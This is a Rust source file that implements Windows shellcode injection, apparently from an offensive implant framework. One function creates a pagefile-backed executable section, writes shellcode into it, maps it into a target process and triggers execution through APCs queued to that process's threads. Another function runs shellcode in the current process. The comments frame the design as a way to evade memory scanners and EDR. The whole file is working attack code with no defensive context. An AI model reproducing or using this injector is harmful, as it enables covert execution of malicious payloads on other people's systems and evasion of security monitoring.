#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};

// ─── Cross-process section injection ────────────────────────────────────────
//
// Creates a pagefile-backed RWX section, writes shellcode into it locally,
// then maps it into the target process and delivers execution via APC.
// No module enumeration, no PE header parsing, no writes to DLL sections —
// same class of memory as CLR/JIT allocations (pagefile-backed, no file VAD).

/// Inject `shellcode` into `pid` via a shared pagefile-backed section + APC.
#[cfg(all(target_os = "windows", feature = "inject-stomp"))]
pub fn inject_stomp_remote(pid: u32, shellcode: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_create_section, nt_map_view, nt_unmap_view, nt_queue_apc, nt_close, CURRENT_PROCESS};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
    };
    use windows_sys::Win32::System::Threading::{OpenThread, THREAD_SET_CONTEXT, THREAD_QUERY_INFORMATION};
    use core::ptr::null_mut;

    const PAGE_EXECUTE_READ:  u32 = 0x20;
    const PAGE_READWRITE:     u32 = 0x04;
    const SECTION_ALL_ACCESS: u32 = 0x000F_001F;
    const SEC_COMMIT:         u32 = 0x0800_0000;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    let proc = super::open_process_rw(pid)
        .map_err(|st| format!("stomp: open failed ({st:#010x})"))?;

    // 1. Pagefile-backed RWX section for shellcode (same class as UDRL)
    let mut sz = shellcode.len() as i64;
    let mut hsec: isize = 0;
    let st = unsafe { nt_create_section(&mut hsec, SECTION_ALL_ACCESS, &mut sz, PAGE_EXECUTE_READWRITE, SEC_COMMIT) };
    if st != 0 || hsec == 0 {
        unsafe { CloseHandle(proc as _) };
        return Err(format!("stomp: create_section ({st:#010x})"));
    }

    // 2. Map locally as RW, write shellcode, then unmap
    let mut lva: *mut u8 = null_mut();
    let mut lsz: usize = shellcode.len();
    if unsafe { nt_map_view(hsec, CURRENT_PROCESS, &mut lva, &mut lsz, PAGE_READWRITE) } != 0 || lva.is_null() {
        unsafe { nt_close(hsec); CloseHandle(proc as _) };
        return Err("stomp: local map failed".into());
    }
    unsafe { core::ptr::copy_nonoverlapping(shellcode.as_ptr(), lva, shellcode.len()) };
    unsafe { nt_unmap_view(CURRENT_PROCESS, lva) };

    // 3. Map into remote process as RX — remote mapping keeps section alive after we close hsec
    let mut rva: *mut u8 = null_mut();
    let mut rsz: usize = shellcode.len();
    let st = unsafe { nt_map_view(hsec, proc, &mut rva, &mut rsz, PAGE_EXECUTE_READ) };
    unsafe { nt_close(hsec) };
    if st != 0 || rva.is_null() {
        unsafe { CloseHandle(proc as _) };
        return Err(format!("stomp: remote map ({st:#010x})"));
    }

    // 4. APC to all alertable threads in the target
    let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if snap != INVALID_HANDLE_VALUE {
        let mut e: THREADENTRY32 = unsafe { core::mem::zeroed() };
        e.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
        if unsafe { Thread32First(snap, &mut e) } != 0 {
            loop {
                if e.th32OwnerProcessID == pid {
                    let th = unsafe { OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, 0, e.th32ThreadID) };
                    if th != 0 {
                        unsafe {
                            nt_queue_apc(th as isize, rva as *const u8, null_mut(), null_mut(), null_mut());
                            CloseHandle(th);
                        }
                    }
                }
                e = unsafe { core::mem::zeroed() };
                e.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
                if unsafe { Thread32Next(snap, &mut e) } == 0 { break; }
            }
        }
        unsafe { CloseHandle(snap as _) };
    }

    unsafe { CloseHandle(proc as _) };
    Ok(())
}

// ─── In-process shellcode execution ──────────────────────────────────────────

/// Execute `shellcode` in the current process via a pagefile-backed RWX section.
/// No VirtualProtect on any existing DLL section.
#[cfg(target_os = "windows")]
pub fn inject_stomp(module_name: &str, shellcode: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_create_section, nt_map_view, nt_unmap_view, nt_close, CURRENT_PROCESS};
    use core::ptr::null_mut;

    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const SECTION_ALL_ACCESS:     u32 = 0x000F_001F;
    const SEC_COMMIT:             u32 = 0x0800_0000;

    let _ = module_name; // parameter kept for ABI compat

    let mut sz = shellcode.len() as i64;
    let mut hsec: isize = 0;
    let st = unsafe { nt_create_section(&mut hsec, SECTION_ALL_ACCESS, &mut sz, PAGE_EXECUTE_READWRITE, SEC_COMMIT) };
    if st != 0 || hsec == 0 {
        return Err(format!("stomp(local): create_section ({st:#010x})"));
    }

    let mut va: *mut u8 = null_mut();
    let mut vsz: usize = shellcode.len();
    if unsafe { nt_map_view(hsec, CURRENT_PROCESS, &mut va, &mut vsz, PAGE_EXECUTE_READWRITE) } != 0 || va.is_null() {
        unsafe { nt_close(hsec) };
        return Err("stomp(local): map failed".into());
    }
    unsafe { nt_close(hsec) }; // mapping keeps section alive

    unsafe { core::ptr::copy_nonoverlapping(shellcode.as_ptr(), va, shellcode.len()) };

    let exec: unsafe fn() = unsafe { core::mem::transmute(va) };
    unsafe { exec() };

    unsafe { nt_unmap_view(CURRENT_PROCESS, va) };
    Ok(())
}
